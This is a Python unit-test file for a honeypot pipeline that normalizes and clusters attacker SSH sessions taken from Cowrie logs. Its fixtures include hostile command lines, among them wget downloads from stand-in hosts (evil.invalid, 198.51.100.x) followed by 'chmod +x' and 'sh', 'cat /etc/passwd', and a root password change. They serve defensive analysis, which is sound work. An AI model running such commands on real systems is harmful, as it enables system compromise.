from contextlib import closing, redirect_stdout
import io
import json
from pathlib import Path
import sqlite3
import tempfile
import unittest

import ingest
from ml.cluster import TEST_IPS, assign, carry_ids, fit, normalize_part, normalize_session, seq_weights, split_command


class NormalizeTests(unittest.TestCase):
    def test_split_keeps_pipe(self):
        self.assertEqual(split_command('cd /tmp; ls -la && uname -a || id | grep x'),
                         ['cd /tmp', 'ls -la', 'uname -a', 'id | grep x'])
        self.assertEqual(split_command('rm -rf a\n\n/bin/busybox wget x\r\nsh x'),
                         ['rm -rf a', '/bin/busybox wget x', 'sh x'])

    def test_examples(self):
        cases = {
            'wget http://1.2.3.4:8080/bins/x86 -O /tmp/x': 'wget <URL> -O /tmp/x',
            'echo "root:Pa55w0rd!"|chpasswd': 'echo "root:<PASS>"|chpasswd',
            'ssh root@10.0.0.1:22': 'ssh root@<IP>',
            'echo ' + 'c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCQVFD' + ' | base64 -d':
                'echo <B64> | base64 -d',
            'echo deadbeefcafebabe1234 > /tmp/k': 'echo <HEX> > /tmp/k',
            'chmod 777 /tmp/a8sd9f7Q2x': 'chmod <NUM> /tmp/<FILE>',
            'cat   /proc/cpuinfo |  head -n 1': 'cat /proc/cpuinfo | head -n <NUM>',
            'uname -m 2>&1': 'uname -m 2>&1',
            # 장치·커널 경로는 <FILE>로 바꾸지 않는다
            'dd if=/dev/mmcblk0p1 of=/tmp/x': 'dd if=/dev/mmcblk0p1 of=/tmp/x',
            'cat /dev/mtdblock0': 'cat /dev/mtdblock0',
            'ls /sys/class/net/enp0s31f6': 'ls /sys/class/net/enp0s31f6',
            # '/'로 시작하는 긴 경로는 <B64>로 삼키지 않는다
            'cat /var/lib/docker/AbCdEf1234567890GhIjKl1234567890MnOpQr/x':
                'cat /var/lib/docker/<FILE>/x',
        }
        for raw, expected in cases.items():
            with self.subTest(raw=raw):
                self.assertEqual(normalize_part(raw), expected)

    def test_downloaded_file_name_in_same_session(self):
        cmds = ['cd /tmp; wget http://evil.invalid/bins.sh', 'chmod +x bins.sh; sh ./bins.sh']
        self.assertEqual(normalize_session(cmds),
                         ('cd /tmp', 'wget <URL>', 'chmod +x <FILE>', 'sh ./<FILE>'))
        # 다른 세션에서는 같은 이름이라도 바꾸지 않는다
        self.assertEqual(normalize_session(['sh bins.sh']), ('sh bins.sh',))


def event(sid, ip, eventid, ts, **extra):
    return {'session': sid, 'src_ip': ip, 'eventid': eventid, 'sensor': 'syd',
            'timestamp': f'2026-10-28T00:00:{ts:02d}Z', **extra}


RECON = ['uname -a', 'cat /etc/passwd; echo {i}']
DROPPER = ['cd /tmp; wget http://198.51.100.{i}/x{i}.sh', 'chmod +x x{i}.sh; sh x{i}.sh']


def attack(sid, ip, cmds, i):
    return [event(sid, ip, 'cowrie.session.connect', 0, protocol='ssh')] + [
        event(sid, ip, 'cowrie.command.input', j + 1, input=c.format(i=i)) for j, c in enumerate(cmds)]


def ingest_events(con, tmp, name, events):
    log = Path(tmp, 'syd', name)
    log.parent.mkdir(exist_ok=True)
    log.write_text('\n'.join(json.dumps(e) for e in events), encoding='utf-8')
    ingest.save(con, 'syd', *ingest.collect(log)[:4])


class WeightTests(unittest.TestCase):
    def test_ip_cap(self):
        sessions = {('s', i): {'src_ip': ip} for i, ip in enumerate(['a'] * 8 + ['b'] * 2 + ['a'])}
        norm = {k: ('x',) if k[1] < 10 else ('y',) for k in sessions}
        index = {('x',): 0, ('y',): 1}
        self.assertEqual(seq_weights(list(sessions), norm, sessions, index, 0), [10, 1])
        self.assertEqual(seq_weights(list(sessions), norm, sessions, index, 5), [7, 1])  # a 8→5, b 2


class PipelineTests(unittest.TestCase):
    def test_fit_then_assign(self):
        events = []
        for i in range(20):
            events += attack(f'recon{i:02d}', f'203.0.113.{i}', RECON, i)
        for i in range(15):
            events += attack(f'drop{i:02d}', f'203.0.113.{100 + i}', DROPPER, i)
        events += attack('mine', TEST_IPS[0], RECON, 0)
        events += [event('noproto', '198.51.100.9', 'cowrie.command.input', 1, input='uname -a')]
        with tempfile.TemporaryDirectory() as tmp, closing(sqlite3.connect(Path(tmp, 'h.db'))) as con:
            con.executescript(ingest.SCHEMA)
            ingest_events(con, tmp, 'cowrie.json', events)
            out, models = Path(tmp, 'out'), Path(tmp, 'models')
            with redirect_stdout(io.StringIO()):
                fit(con, out, models)
            fitted = dict(con.execute('SELECT session_id, cluster_id FROM ml_clusters'))
            self.assertEqual(set(fitted), {f'recon{i:02d}' for i in range(20)} | {f'drop{i:02d}' for i in range(15)})
            self.assertEqual((fitted['recon00'], fitted['drop00']), (0, 1))  # 처음 fit은 크기 순
            self.assertTrue(Path(models, 'ssh.joblib').exists())

            # 새 세션 하나만 저장된 모델로 배정되고 테스트 IP 세션은 여전히 빠진다
            ingest_events(con, tmp, 'cowrie.json.1', attack('newdrop', '192.0.2.7', DROPPER, 77)
                          + attack('mine2', TEST_IPS[2], DROPPER, 1))
            with redirect_stdout(io.StringIO()):
                stats = assign(con, out, models)  # 마지막 이벤트와 같은 시각이라 아직 진행 중일 수 있음
            self.assertEqual((stats['new_sessions'], stats['pending'], stats['assigned']), (1, 1, 0))
            self.assertNotIn('newdrop', dict(con.execute('SELECT session_id, 1 FROM ml_clusters')))
            with redirect_stdout(io.StringIO()):
                stats = assign(con, out, models, settle_minutes=0)
            self.assertEqual((stats['assigned'], stats['noise'], stats['pending']), (1, 0, 0))
            rows = {sid: (c, by) for sid, c, by in con.execute(
                'SELECT session_id, cluster_id, assigned_by FROM ml_clusters')}
            self.assertEqual(rows['newdrop'], (fitted['drop00'], 'assign'))
            self.assertNotIn('mine', rows)
            self.assertNotIn('mine2', rows)
            for name in ('session_clusters.csv', 'cluster_summary.csv', 'novel_candidates.csv',
                         'comparison.csv', 'hdbscan_selection.md'):
                self.assertTrue(Path(out, name).exists(), name)

            # drop이 recon보다 커져도 다시 fit하면 이전 번호를 이어 받는다
            ingest_events(con, tmp, 'cowrie.json.2', [e for i in range(10) for e in
                                                      attack(f'drop2_{i}', f'198.51.100.{i}', DROPPER, i)])
            with redirect_stdout(io.StringIO()):
                fit(con, out, models)
            refit = dict(con.execute('SELECT session_id, cluster_id FROM ml_clusters'))
            self.assertEqual((refit['recon00'], refit['drop00'], refit['drop2_0'], refit['newdrop']), (0, 1, 1, 1))


class CarryIdsTests(unittest.TestCase):
    def test_overlap_and_new_ids(self):
        old = {'a': 1, 'b': 1, 'c': 0, 'e': 3, 'f': -1}
        new = {'a': 0, 'b': 0, 'c': 1, 'd': 2, 'f': 0, 'g': -1}
        self.assertEqual(carry_ids(new, old), {-1: -1, 0: 1, 1: 0, 2: 4})  # 2는 짝이 없어 이전 최대 3 다음 번호

    def test_one_old_id_per_new_cluster(self):
        old = {'a': 5, 'b': 5, 'c': 5}
        new = {'a': 0, 'b': 0, 'c': 1}  # 0이 겹침이 더 커서 5를 갖고, 1은 새 번호
        self.assertEqual(carry_ids(new, old), {-1: -1, 0: 5, 1: 6})


if __name__ == '__main__':
    unittest.main()
